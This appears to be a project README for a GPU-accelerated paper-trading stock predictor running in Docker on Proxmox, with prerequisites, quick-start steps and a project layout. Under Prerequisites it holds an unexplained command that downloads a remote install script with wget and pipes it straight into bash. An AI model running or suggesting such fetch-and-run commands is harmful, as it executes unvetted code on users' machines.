# Proxmox AI Stock Predictor

A closed-loop paper trading system running on Proxmox with GPU acceleration.

## Prerequisites

Before running this project, ensure you have the following installed and configured:
bash -c "$(wget -qO- https://raw.githubusercontent.com/Suacett/Isolated-Training-Experiment/MAIN-BRANCH/install.sh)"

1.  **Docker & Docker Compose**: For container orchestration.
2.  **NVIDIA GPU**:
    *   Supported GPUs: NVIDIA T400, RTX 4080 Super, or similar.
    *   **NVIDIA Container Toolkit**: Must be installed on the host to allow Docker containers to access the GPU.
3.  **Proxmox Environment**: (Optional but recommended) Host system running Proxmox VE.

## Quick Start

1.  **Environment Setup**:
    Copy `.env.example` to `.env` and add your Alpha Vantage API key.
    ```bash
    cp .env.example .env
    ```

2.  **Build and Run**:
    ```bash
    docker compose up -d --build
    ```

3.  **Access Services**:
    *   **Frontend**: http://localhost:3001
    *   **Backend API**: http://localhost:8000
    *   **Database**: Port 5432

## Project Structure

*   `backend/`: FastAPI application (Python).
*   `frontend/`: Next.js dashboard (TypeScript).
*   `legacy/`: Old Jupyter notebooks and datasets (Reference only).
*   `docker-compose.yml`: Service orchestration.

## Development

*   **Backend**:
    *   Scripts: `backend/scripts/`
    *   Tests: `backend/tests/`
*   **Frontend**:
    *   Next.js App Router structure in `frontend/app/`

## License

[Your License Here]
